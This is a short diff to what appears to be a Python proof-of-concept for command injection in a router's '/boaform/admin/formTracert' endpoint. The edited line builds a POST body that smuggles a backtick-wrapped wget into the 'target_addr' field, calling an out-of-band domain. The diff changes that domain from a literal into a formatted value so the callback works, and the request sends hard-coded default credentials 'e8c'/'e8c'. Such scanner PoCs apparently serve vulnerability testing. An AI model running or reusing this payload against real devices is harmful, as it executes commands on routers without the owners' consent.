@@ -42,7 +42,7 @@ def poc(url):
 
         path = """/boaform/admin/formTracert"""
         method = "POST"
-        data = '''target_addr="1.1.1.1+`wget+http%3A%2F%2Foob_domain%2F`"&waninf=127.0.0.1"'''
+        data = '''target_addr="1.1.1.1+`wget+http%3A%2F%2F{oob_domain}%2F`"&waninf=127.0.0.1"'''.format(oob_domain=oob_domain)
         headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded', 'User': 'e8c', 'Password': 'e8c'}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
